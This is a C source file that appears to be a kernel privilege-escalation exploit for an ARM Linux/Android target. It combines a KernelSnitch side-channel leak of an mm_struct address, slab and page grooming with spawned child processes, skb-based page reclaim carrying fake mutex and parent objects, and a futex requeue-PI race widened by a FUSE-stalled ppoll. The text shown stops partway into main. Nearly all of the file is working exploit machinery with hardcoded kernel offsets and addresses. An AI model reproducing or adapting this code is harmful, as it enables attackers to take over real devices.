#define _GNU_SOURCE
#define __ARM 1
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xFFFFFF8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END   0xFFFFFF9000000000ULL
#endif

#include "kernelsnitch/kernelsnitch.h"

#include <linux/futex.h>
#include <poll.h>
#include <pthread.h>
#include <stddef.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdio.h>
#include <signal.h>

#define E1_PPOLL_NFDS 14
#define INJECT_FIRST_PAGE_BYTES 104
#define MAP_PAGES 64
#define STALL_PAGE 8
#define TR "/sys/kernel/tracing"

#define MM_STRUCT_SZ 0x400
#define MM_ORDER 3
#define MM_PARTIALS 5
#define CORE 0
#define KSNITCH_COLLISIONS 4
#define ORDER3_SIZE (4096UL << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define SKB_DATA_DELTA (-0xe80LL)
#define LOCK_OFF 0x1350
#define PARENT_OFF 0x4440
#define INIT_TASK_PHYSMAP 0xffffff8003306400ULL

enum { MODE_LEAK = 0, MODE_PAGE = 1, MODE_KS = 2 };

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

static size_t page_sz;
static int g_proxy_fd = -1;
static int g_mode;
static int g_cons_lock_target;
static unsigned long g_task_q;
static unsigned long g_lock_q;
static unsigned long g_parent_q;
static unsigned long g_page_base;
static unsigned long g_mm_struct;
static volatile int owner_ready;
static volatile int chain_held;
static volatile int waiter_waiting;
static volatile int requeue_done;
static volatile int stall_held;
static volatile int consumer_started;
static volatile int consumer_done;
static volatile int g_in_ppoll;
static volatile long g_ppoll_ret;
static volatile int g_ppoll_errno;
static volatile long g_consumer_ret;
static volatile int g_consumer_errno;
static volatile pid_t g_owner_tid;
static volatile pid_t g_waiter_tid;
static volatile pid_t g_consumer_tid;
static struct timespec g_ppoll_t0, g_ppoll_t1, g_cons_t0, g_cons_t1;
static uint32_t f_wait, f_target, f_chain;

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx, spray_ctx, pre_ctx, post_ctx;
static pid_t child_leak;
static int memfd_leak = -1;

static long ns_delta(const struct timespec *a, const struct timespec *b) {
  return (b->tv_sec - a->tv_sec) * 1000000000L + (b->tv_nsec - a->tv_nsec);
}

static pid_t mytid(void) { return (pid_t)syscall(SYS_gettid); }

static int wr_sys(const char *path, const char *val) {
  int fd = open(path, O_WRONLY);
  if (fd < 0) {
    printf("[e1c5] open %s errno=%d\n", path, errno);
    return -1;
  }
  ssize_t n = write(fd, val, strlen(val));
  int e = errno;
  close(fd);
  if (n < 0) {
    printf("[e1c5] write %s errno=%d\n", path, e);
    return -1;
  }
  return 0;
}

static int wr_file(const char *path, const char *val) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd < 0) return -1;
  ssize_t n = write(fd, val, strlen(val));
  close(fd);
  return n < 0 ? -1 : 0;
}

static long ftx(uint32_t *uaddr, int op, uint32_t val,
                const struct timespec *arg4, uint32_t *uaddr2) {
  return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, 0);
}

static void print_ret(const char *name, long ret, int saved) {
  printf("[e1c5] %s ret=%ld errno=%d\n", name, ret, saved);
}

static void put_qword_from(struct pollfd *pf, int idx, unsigned long q) {
  pf[idx].events = (short)(q & 0xffffUL);
  pf[idx].revents = (short)((q >> 16) & 0xffffUL);
  pf[idx + 1].fd = (int)(int32_t)((q >> 32) & 0xffffffffUL);
}

static void put_overlay(struct pollfd *pf, unsigned long parent,
                        unsigned long task, unsigned long lock) {
  put_qword_from(pf, 4, parent);
  put_qword_from(pf, 5, 0);
  put_qword_from(pf, 6, 0);
  put_qword_from(pf, 7, parent);
  put_qword_from(pf, 8, 0);
  put_qword_from(pf, 9, 0);
  put_qword_from(pf, 10, task);
  put_qword_from(pf, 11, lock);
  pf[12].events = 0;
  pf[12].revents = 0;
}

static int set_nice_tid(pid_t tid, int niceval, const char *tag) {
  errno = 0;
  int r = setpriority(PRIO_PROCESS, tid, niceval);
  int e = errno;
  int now = getpriority(PRIO_PROCESS, tid);
  printf("[e1c5] setpriority %s tid=%d want=%d ret=%d errno=%d now=%d\n",
         tag, tid, niceval, r, e, now);
  return r;
}

static int wait_flag_ms(volatile int *flag, int want, int timeout_ms) {
  struct timespec t0, t1;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  while (__atomic_load_n(flag, __ATOMIC_SEQ_CST) != want) {
    clock_gettime(CLOCK_MONOTONIC, &t1);
    if (ns_delta(&t0, &t1) > (long)timeout_ms * 1000000L) return -1;
    usleep(1000);
  }
  return 0;
}

static void dump_pi_trace(void) {
  int fd = open(TR "/trace", O_RDONLY);
  if (fd < 0) {
    printf("[e1c5] trace open errno=%d\n", errno);
    return;
  }
  char buf[8192], line[1024];
  size_t used = 0;
  int hits = 0;
  printf("[e1c5] ===== PI TRACE BEGIN =====\n");
  for (;;) {
    ssize_t n = read(fd, buf, sizeof(buf));
    if (n <= 0) break;
    for (ssize_t i = 0; i < n; ++i) {
      if (used + 1 >= sizeof(line)) used = 0;
      line[used++] = buf[i];
      if (buf[i] != '\n') continue;
      line[used] = 0;
      if (strstr(line, "sched_pi_setprio") || strstr(line, "e1c5")) {
        fwrite(line, 1, used, stdout);
        hits++;
      }
      used = 0;
    }
  }
  close(fd);
  printf("[e1c5] ===== PI TRACE END hits=%d =====\n", hits);
}

static int recv_proxy_fd(void) {
  int srv = socket(AF_UNIX, SOCK_STREAM, 0);
  if (srv < 0) {
    printf("[e1c5] socket errno=%d\n", errno);
    return -1;
  }
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  addr.sun_path[0] = '\0';
  memcpy(addr.sun_path + 1, "e1c3fuse", 8);
  socklen_t len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + 8);
  if (bind(srv, (struct sockaddr *)&addr, len) != 0) {
    printf("[e1c5] bind errno=%d\n", errno);
    close(srv);
    return -1;
  }
  if (listen(srv, 1) != 0) {
    printf("[e1c5] listen errno=%d\n", errno);
    close(srv);
    return -1;
  }
  printf("[e1c5] listening abstract e1c3fuse\n");
  int conn = accept(srv, NULL, NULL);
  if (conn < 0) {
    printf("[e1c5] accept errno=%d\n", errno);
    close(srv);
    return -1;
  }
  char buf[8];
  struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
  char cmsgbuf[CMSG_SPACE(sizeof(int))];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cmsgbuf;
  msg.msg_controllen = sizeof(cmsgbuf);
  ssize_t n = recvmsg(conn, &msg, 0);
  int fd = -1;
  if (n >= 0) {
    for (struct cmsghdr *c = CMSG_FIRSTHDR(&msg); c; c = CMSG_NXTHDR(&msg, c)) {
      if (c->cmsg_level == SOL_SOCKET && c->cmsg_type == SCM_RIGHTS) {
        memcpy(&fd, CMSG_DATA(c), sizeof(fd));
        break;
      }
    }
  }
  printf("[e1c5] recvmsg n=%zd fd=%d errno=%d\n", n, fd, errno);
  close(conn);
  close(srv);
  return fd;
}

static pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) _exit(0);
    pin_to_core(CORE);
    for (;;) pause();
  }
  return child;
}

static pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

static void kill_child(pid_t child) {
  if (child <= 0) return;
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

static void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

static void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);
  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);
  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

static void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void prepare_zero_mutex_payload(uintptr_t base) {
  memset(skb_buf, 0, SKB_SEND_SIZE);
  uintptr_t payload_base = base + (uintptr_t)(intptr_t)SKB_DATA_DELTA;
  uintptr_t fake_lock = payload_base + LOCK_OFF;
  uintptr_t fake_parent = payload_base + PARENT_OFF;
  g_lock_q = fake_lock;
  g_parent_q = fake_parent;
  g_task_q = INIT_TASK_PHYSMAP;
  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk;
    /* IonStack skb-data relative (LOCK_OFF=0x1350) */
    put64(p, LOCK_OFF - 8, 0xe1c5e1c5e1c5e1c5ULL);
    put32(p, LOCK_OFF + 0x00, 0);
    put64(p, LOCK_OFF + 0x08, 0);
    put64(p, LOCK_OFF + 0x10, 0);
    put64(p, LOCK_OFF + 0x18, 0);
    put64(p, PARENT_OFF - 8, 0xe1c5b0b0e1c5b0b0ULL);
    put64(p, PARENT_OFF + 0x00, fake_parent);
    put64(p, PARENT_OFF + 0x08, 0x2222222222222222ULL);
    put64(p, PARENT_OFF + 0x10, 0x3333333333333333ULL);
    /* page-relative alias: lock at slab+0x4d0, parent at slab+0x35c0 */
    put64(p, 0x4d0 - 8, 0xe1c504d0e1c504d0ULL);
    put32(p, 0x4d0 + 0x00, 0);
    put64(p, 0x4d0 + 0x08, 0);
    put64(p, 0x4d0 + 0x10, 0);
    put64(p, 0x4d0 + 0x18, 0);
    put64(p, 0x35c0 - 8, 0xe1c535c0e1c535c0ULL);
    put64(p, 0x35c0 + 0x00, base + 0x35c0);
    put64(p, 0x35c0 + 0x08, 0x2222222222222222ULL);
    put64(p, 0x35c0 + 0x10, 0x3333333333333333ULL);
  }
  /* Point overlay at PAGE-relative objects (skb frag == order-3 page). */
  g_lock_q = base + 0x4d0;
  g_parent_q = base + 0x35c0;
  printf("[e1c5] payload base=0x%lx lock=0x%lx parent=0x%lx task=0x%lx delta_lock=0x%lx\n",
         (unsigned long)base, g_lock_q, g_parent_q, g_task_q,
         (unsigned long)fake_lock);
}

static int looks_kptr(uint64_t v) {
  return (v >= 0xffffff8000000000ULL && v < 0xffffff9000000000ULL) ||
         (v >= 0xffffffc000000000ULL && v < 0xfffffff000000000ULL);
}

static void dump_qwords(const char *tag, const unsigned char *p, size_t off, int n) {
  printf("[e1c5] %s off=0x%zx", tag, off);
  for (int i = 0; i < n; i++) {
    uint64_t v = 0;
    memcpy(&v, p + off + (size_t)i * 8, 8);
    printf(" %016llx", (unsigned long long)v);
  }
  printf("\n");
}

static void scan_kptrs(const char *tag, const unsigned char *buf, size_t len) {
  int hits = 0;
  for (size_t off = 0; off + 8 <= len; off += 8) {
    uint64_t v = 0;
    memcpy(&v, buf + off, 8);
    if (!looks_kptr(v)) continue;
    printf("[e1c5] %s kptr off=0x%zx val=0x%016llx\n",
           tag, off, (unsigned long long)v);
    if (++hits >= 32) {
      printf("[e1c5] %s kptr truncated\n", tag);
      break;
    }
  }
  printf("[e1c5] %s kptr_hits=%d\n", tag, hits);
}

static void inspect_blob(const char *tag, const unsigned char *buf, size_t len) {
  printf("[e1c5] inspect %s len=%zu\n", tag, len);
  for (size_t chunk = 0; chunk + ORDER3_SIZE <= len; chunk += ORDER3_SIZE) {
    const unsigned char *p = buf + chunk;
    int magic_lock = 0, magic_parent = 0;
    uint64_t ml = 0, mp = 0;
    memcpy(&ml, p + LOCK_OFF - 8, 8);
    memcpy(&mp, p + PARENT_OFF - 8, 8);
    magic_lock = (ml == 0xe1c5e1c5e1c5e1c5ULL);
    magic_parent = (mp == 0xe1c5b0b0e1c5b0b0ULL);
    printf("[e1c5] %s chunk=0x%zx magic_lock=%d magic_parent=%d\n",
           tag, chunk, magic_lock, magic_parent);
    dump_qwords(tag, p, LOCK_OFF - 8, 6);
    dump_qwords(tag, p, PARENT_OFF - 8, 4);
    dump_qwords(tag, p, 0x4d0 - 8, 6);
    dump_qwords(tag, p, 0x35c0 - 8, 4);
  }
  scan_kptrs(tag, buf, len);
}

static void dump_reclaim(const char *tag, int peek) {
  if (reclaim_sv[1] < 0) {
    printf("[e1c5] dump %s no recv socket\n", tag);
    return;
  }
  int flags = peek ? MSG_PEEK : 0;
  size_t cap = (size_t)SKB_SEND_SIZE * SKB_RECLAIM_SENDS;
  unsigned char *buf = malloc(cap);
  if (!buf) return;
  memset(buf, 0, cap);
  size_t got = 0;
  for (;;) {
    ssize_t n = recv(reclaim_sv[1], buf + got, cap - got, flags | MSG_DONTWAIT);
    if (n <= 0) {
      printf("[e1c5] dump %s recv n=%zd errno=%d got=%zu peek=%d\n",
             tag, n, errno, got, peek);
      break;
    }
    got += (size_t)n;
    if (got >= cap || peek) break;
  }
  inspect_blob(tag, buf, got);
  if (got > 0 && skb_buf) {
    size_t cmp = got < SKB_SEND_SIZE ? got : SKB_SEND_SIZE;
    int diff = memcmp(buf, skb_buf, cmp);
    printf("[e1c5] dump %s memcmp_skb=%d cmp=%zu\n", tag, diff, cmp);
    if (diff && cmp >= LOCK_OFF + 0x20) {
      printf("[e1c5] dump %s first_diff scanning lock/parent\n", tag);
    }
  }
  free(buf);
}

static uintptr_t leak_own_mm(int verbose) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  printf("[e1c5] KS leak setup cpu=%d mm_sz=0x%x order=%d\n",
         cpu_count, MM_STRUCT_SZ, MM_ORDER);
  struct kernelsnitch_shared_state *lks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, verbose, 0);
  if (!lks) {
    printf("[e1c5] ks setup failed\n");
    return (uintptr_t)-1;
  }
  kernelsnitch_find_collisions(lks);
  if (!kernelsnitch_found_collisions(lks)) {
    printf("[e1c5] collision finding failed state=%d\n", (int)lks->state);
    kernelsnitch_cleanup(lks);
    return (uintptr_t)-1;
  }
  printf("[e1c5] collisions found, bruteforce...\n");
  kernelsnitch_bruteforce(lks);
  uintptr_t leaked = (uintptr_t)lks->mm_struct;
  printf("[e1c5] own_mm=0x%lx state=%d\n", (unsigned long)leaked, (int)lks->state);
  kernelsnitch_cleanup(lks);
  return leaked;
}

static uintptr_t prepare_kernel_page(void) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  printf("[e1c5] prepare_kernel_page objs_per_slab=%zu prepare=%zu spray=%zu\n",
         mm_objs_per_slab, 32 * mm_objs_per_slab,
         (1 + MM_PARTIALS) * mm_objs_per_slab);
  prepare_ctxs();
  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    printf("[e1c5] skb malloc failed\n");
    return 0;
  }
  memset(skb_buf, 0, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
    pre_ctx.childs[i] = clone_child();
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++)
    post_ctx.childs[i] = clone_child();

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++)
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
    kill_child(pre_ctx.childs[i]);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++)
    kill_child(post_ctx.childs[i]);
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++)
    kill_child(spray_ctx.childs[i]);
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    printf("[e1c5] KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    return 0;
  }
  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  g_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    printf("[e1c5] KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    return 0;
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  printf("[e1c5] leaked_mm=0x%lx slab_base=0x%lx\n",
         (unsigned long)leaked, (unsigned long)base);
  prepare_zero_mutex_payload(base);

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0)
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  for (int i = 0; i < 4; i++) sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    printf("[e1c5] reclaim send[%d]=%zd errno=%d\n", i, sent, errno);
    if (sent <= 0) break;
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] > 0) {
      close(prepare_ctx.memfds[i]);
      prepare_ctx.memfds[i] = -1;
    }
    kill_child(prepare_ctx.childs[i]);
  }
  g_page_base = base;
  return base;
}

static int run_stalled_ppoll(void) {
  const size_t map_len = page_sz * MAP_PAGES;
  const size_t stall_off = page_sz * STALL_PAGE;
  unlink("/data/local/tmp/fusestall.release");
  unlink("/data/local/tmp/fusestall.arm");
  posix_fadvise(g_proxy_fd, 0, (off_t)map_len, POSIX_FADV_RANDOM);
  void *area = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, g_proxy_fd, 0);
  if (area == MAP_FAILED) {
    printf("[e1c5] mmap errno=%d\n", errno);
    return -1;
  }
  if (stall_off > 0) memset(area, 0, stall_off);
  posix_fadvise(g_proxy_fd, (off_t)stall_off, (off_t)page_sz, POSIX_FADV_DONTNEED);
  madvise((char *)area + stall_off, page_sz, MADV_DONTNEED);

  char *base = (char *)area + stall_off - (size_t)INJECT_FIRST_PAGE_BYTES;
  struct pollfd *pf = (struct pollfd *)base;
  for (int i = 0; i < E1_PPOLL_NFDS; ++i) {
    if ((size_t)((i + 1) * (int)sizeof(struct pollfd)) <= (size_t)INJECT_FIRST_PAGE_BYTES) {
      pf[i].fd = -1;
      pf[i].events = POLLIN;
      pf[i].revents = 0;
    }
  }
  put_overlay(pf, g_parent_q, g_task_q, g_lock_q);
  printf("[e1c5] template parent=0x%016lx task=0x%016lx lock=0x%016lx\n",
         g_parent_q, g_task_q, g_lock_q);
  printf("[e1c5] p4(ev=%#x rev=%#x) p5(fd=%#x) p10(ev=%#x rev=%#x) p11(fd=%#x ev=%#x rev=%#x) p12(fd=%#x)\n",
         (unsigned)(uint16_t)pf[4].events, (unsigned)(uint16_t)pf[4].revents,
         (unsigned)pf[5].fd, (unsigned)(uint16_t)pf[10].events,
         (unsigned)(uint16_t)pf[10].revents, (unsigned)pf[11].fd,
         (unsigned)(uint16_t)pf[11].events, (unsigned)(uint16_t)pf[11].revents,
         (unsigned)pf[12].fd);
  printf("[e1c5] ppoll_cross base=%p first_bytes=%d stall=%p waiter_tid=%d\n",
         pf, INJECT_FIRST_PAGE_BYTES, (char *)area + stall_off, mytid());
  wr_file("/data/local/tmp/fusestall.arm", "1\n");
  __atomic_store_n(&g_in_ppoll, 1, __ATOMIC_SEQ_CST);
  clock_gettime(CLOCK_MONOTONIC, &g_ppoll_t0);
  errno = 0;
  int ret = ppoll(pf, E1_PPOLL_NFDS, &(struct timespec){0, 0}, NULL);
  int e = errno;
  clock_gettime(CLOCK_MONOTONIC, &g_ppoll_t1);
  g_ppoll_ret = ret;
  g_ppoll_errno = e;
  __atomic_store_n(&g_in_ppoll, 2, __ATOMIC_SEQ_CST);
  print_ret("ppoll", ret, e);
  printf("[e1c5] ppoll dt_ms=%.3f\n", ns_delta(&g_ppoll_t0, &g_ppoll_t1) / 1e6);
  unlink("/data/local/tmp/fusestall.arm");
  munmap(area, map_len);
  return 0;
}

static void *owner_thread(void *unused) {
  (void)unused;
  g_owner_tid = mytid();
  errno = 0;
  long ret = ftx(&f_target, FUTEX_LOCK_PI, 0, NULL, NULL);
  print_ret("owner LOCK_PI(target)", ret, errno);
  if (ret != 0) return NULL;
  __atomic_store_n(&owner_ready, 1, __ATOMIC_SEQ_CST);
  wait_flag_ms(&requeue_done, 1, 8000);
  usleep(30000);
  errno = 0;
  ret = ftx(&f_target, FUTEX_UNLOCK_PI, 0, NULL, NULL);
  print_ret("owner UNLOCK_PI(target)", ret, errno);
  return NULL;
}

static void *waiter_thread(void *unused) {
  (void)unused;
  g_waiter_tid = mytid();
  set_nice_tid(g_waiter_tid, 19, "waiter");
  errno = 0;
  long ret = ftx(&f_chain, FUTEX_LOCK_PI, 0, NULL, NULL);
  print_ret("waiter LOCK_PI(chain)", ret, errno);
  if (ret != 0) return NULL;
  __atomic_store_n(&chain_held, 1, __ATOMIC_SEQ_CST);
  wait_flag_ms(&owner_ready, 1, 8000);
  __atomic_store_n(&waiter_waiting, 1, __ATOMIC_SEQ_CST);
  errno = 0;
  ret = ftx(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &f_target);
  print_ret("waiter WAIT_REQUEUE_PI", ret, errno);
  printf("[e1c5] waiter entering stalled ppoll, still holding chain tid=%d nice=%d\n",
         g_waiter_tid, getpriority(PRIO_PROCESS, g_waiter_tid));
  run_stalled_ppoll();
  errno = 0;
  ret = ftx(&f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL);
  print_ret("waiter UNLOCK_PI(chain)", ret, errno);
  return NULL;
}

static void *consumer_thread(void *unused) {
  (void)unused;
  g_consumer_tid = mytid();
  set_nice_tid(g_consumer_tid, -20, "consumer-high");
  struct timespec t0, t1;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  for (;;) {
    if (__atomic_load_n(&g_in_ppoll, __ATOMIC_SEQ_CST) == 1) {
      clock_gettime(CLOCK_MONOTONIC, &t1);
      if (ns_delta(&g_ppoll_t0, &t1) > 100000000L) {
        __atomic_store_n(&stall_held, 1, __ATOMIC_SEQ_CST);
        break;
      }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    if (ns_delta(&t0, &t1) > 8000000000L) {
      printf("[e1c5] consumer timeout waiting for stall in_ppoll=%d\n", g_in_ppoll);
      return NULL;
    }
    usleep(2000);
  }
  printf("[e1c5] consumer stage=stall_held, LOCK_PI(%s) during copy window tid=%d nice=%d\n",
         g_cons_lock_target ? "target" : "chain",
         g_consumer_tid, getpriority(PRIO_PROCESS, g_consumer_tid));
  __atomic_store_n(&consumer_started, 1, __ATOMIC_SEQ_CST);
  struct timespec abs;
  clock_gettime(CLOCK_REALTIME, &abs);
  abs.tv_sec += 8;
  clock_gettime(CLOCK_MONOTONIC, &g_cons_t0);
  errno = 0;
  uint32_t *cons_lock = g_cons_lock_target ? &f_target : &f_chain;
  long ret = ftx(cons_lock, FUTEX_LOCK_PI, 0, &abs, NULL);
  int e = errno;
  clock_gettime(CLOCK_MONOTONIC, &g_cons_t1);
  g_consumer_ret = ret;
  g_consumer_errno = e;
  print_ret(g_cons_lock_target ? "consumer LOCK_PI(target)" : "consumer LOCK_PI(chain)", ret, e);
  printf("[e1c5] consumer lock dt_ms=%.3f\n", ns_delta(&g_cons_t0, &g_cons_t1) / 1e6);
  if (ret == 0) {
    errno = 0;
    long ur = ftx(cons_lock, FUTEX_UNLOCK_PI, 0, NULL, NULL);
    print_ret(g_cons_lock_target ? "consumer UNLOCK_PI(target)" : "consumer UNLOCK_PI(chain)", ur, errno);
  }
  __atomic_store_n(&consumer_done, 1, __ATOMIC_SEQ_CST);
  return NULL;
}

static void test_window(void) {
  printf("==== B2 + FUSE stall window mode=ks first_bytes=%d lock=0x%lx ====\n",
         INJECT_FIRST_PAGE_BYTES, g_lock_q);
  owner_ready = chain_held = waiter_waiting = requeue_done = 0;
  stall_held = consumer_started = consumer_done = 0;
  g_in_ppoll = 0;
  f_wait = f_target = f_chain = 0;

  wr_sys(TR "/events/sched/sched_switch/enable", "0");
  wr_sys(TR "/events/sched/sched_pi_setprio/enable", "1");
  wr_sys(TR "/trace", "\n");
  wr_sys(TR "/tracing_on", "1");

  pthread_t owner, waiter, consumer;
  pthread_create(&owner, NULL, owner_thread, NULL);
  pthread_create(&waiter, NULL, waiter_thread, NULL);
  pthread_create(&consumer, NULL, consumer_thread, NULL);

  if (wait_flag_ms(&waiter_waiting, 1, 8000) || wait_flag_ms(&owner_ready, 1, 8000))
    printf("[e1c5] setup timeout\n");
  usleep(200000);
  errno = 0;
  long ret = ftx(&f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                 (const struct timespec *)1, &f_target);
  print_ret("main CMP_REQUEUE_PI", ret, errno);
  __atomic_store_n(&requeue_done, 1, __ATOMIC_SEQ_CST);

  if (wait_flag_ms(&stall_held, 1, 8000) != 0)
    printf("[e1c5] stall_held timeout in_ppoll=%d\n", g_in_ppoll);
  else
    printf("[e1c5] stall_held confirmed in_ppoll=%d\n", g_in_ppoll);

  if (wait_flag_ms(&consumer_started, 1, 8000) != 0)
    printf("[e1c5] consumer_started timeout\n");
  else {
    printf("[e1c5] consumer entered LOCK_PI while ppoll stalled; holding 250ms\n");
    usleep(250000);
  }

  printf("[e1c5] releasing FUSE stall\n");
  wr_file("/data/local/tmp/fusestall.release", "1\n");

  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  wr_sys(TR "/tracing_on", "0");
  dump_pi_trace();
  wr_sys(TR "/events/sched/sched_pi_setprio/enable", "0");

  printf("[e1c5] tids owner=%d waiter=%d consumer=%d\n",
         g_owner_tid, g_waiter_tid, g_consumer_tid);
  printf("[e1c5] summary mode=ks stall=%d ppoll=%ld/%d consumer=%ld/%d "
         "ppoll_ms=%.3f cons_ms=%.3f lock=0x%lx\n",
         stall_held, g_ppoll_ret, g_ppoll_errno, g_consumer_ret,
         g_consumer_errno, ns_delta(&g_ppoll_t0, &g_ppoll_t1) / 1e6,
         ns_delta(&g_cons_t0, &g_cons_t1) / 1e6, g_lock_q);
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
